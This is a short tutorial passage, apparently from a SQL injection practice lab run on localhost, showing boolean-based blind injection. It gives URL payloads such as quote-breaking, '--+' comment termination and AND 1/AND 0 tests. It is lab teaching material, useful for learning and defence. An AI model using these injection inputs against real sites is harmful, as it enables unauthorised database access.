Boolean based Injection



Boolean based means TRUE or FALSE.

a) We make a query.

URL: http://localhost/Less-8/?id=1



Result: Instead of showing the Username and Password as in the previous sections, we get a different message “You are in..........”. We don't see any output from the databse. If you change the id number it won't change the message.

b) Let's break the query.

URL: http://localhost/Less-8/?id=1'



Result: Nothing happens. Even though we don't see anything the query is broken.

c) Let's fix the query.

URL: http://localhost/Less-8/?id=1' --+



Result: It's ok. We can change 1 by 2,3,4...

d) Using the parameter AND.

URL: http://localhost/Less-8/?id=1' AND 1 --+



Result: It returns 1 so the query es fixed.

URL: http://localhost/Less-8/?id=1' AND 0 --+



Result: Returns 0 so, we don't have anything.

Here we don't have any Error Based response so we have to try another method to dump information from the database.
